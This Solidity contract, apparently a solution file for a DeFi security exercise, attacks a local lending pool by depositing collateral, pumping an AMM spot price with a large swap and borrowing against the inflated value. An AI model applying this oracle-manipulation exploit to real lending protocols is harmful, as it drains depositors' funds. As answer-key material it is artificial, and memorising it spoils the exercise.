// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./SimpleAMM.sol";
import "./LendingPool.sol";

contract SolutionD3 {
    function manipulateAndBorrow(SimpleAMM amm, LendingPool pool) external {
        // erst Collateral setzen, dann Preis pumpen
        pool.depositA(10 ether);
        amm.swapBforA(5_000 ether);

        uint256 maxNow = pool.maxBorrow(address(this));
        uint256 toBorrow = (maxNow * 95) / 100;
        pool.borrowB(toBorrow);
    }
}

